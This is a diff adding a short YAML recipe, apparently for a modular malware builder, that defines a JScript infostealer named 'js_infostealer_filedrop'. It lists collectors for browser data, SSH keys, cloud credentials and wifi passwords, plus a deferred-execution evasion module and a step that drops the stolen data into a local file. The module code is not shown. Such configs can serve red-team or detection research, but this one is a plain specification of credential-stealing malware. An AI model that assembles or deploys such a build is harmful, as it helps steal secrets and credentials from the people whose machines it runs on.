@@ -1,0 +1,27 @@
+name: js_infostealer_filedrop
+description: JScript infostealer that drops collected data to local file (for manual exfil)
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/network
+  - collectors/installed_software
+  - collectors/browser_chromium
+  - collectors/ssh_keys
+  - collectors/cloud_creds
+  - collectors/wifi_passwords
+
+exfil: exfil/file_drop
+arch: arch/sequential
+
+evasion:
+  - evasion/deferred_exec
+
+vars:
+  EXFIL_FILENAME: "sysdata.log"
